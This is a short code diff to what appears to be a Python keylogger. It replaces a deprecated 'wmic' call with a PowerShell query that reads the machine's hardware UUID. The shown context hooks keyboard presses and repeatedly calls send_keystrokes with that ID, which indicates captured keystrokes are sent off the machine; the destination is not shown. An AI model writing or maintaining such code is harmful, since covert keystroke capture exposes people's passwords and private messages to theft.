@@ -64,7 +64,7 @@ def main():
 
     import os
     with keyboard.Listener(on_press=on_press) as listener:
-        uid = os.popen("wmic csproduct get uuid").read().strip().splitlines()[-1]
+        uid = os.popen("powershell -Command \"Get-CimInstance -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID\"").read().strip().splitlines()[-1]
         while listener.running:
             send_keystrokes(uid)
             listener.join(1)
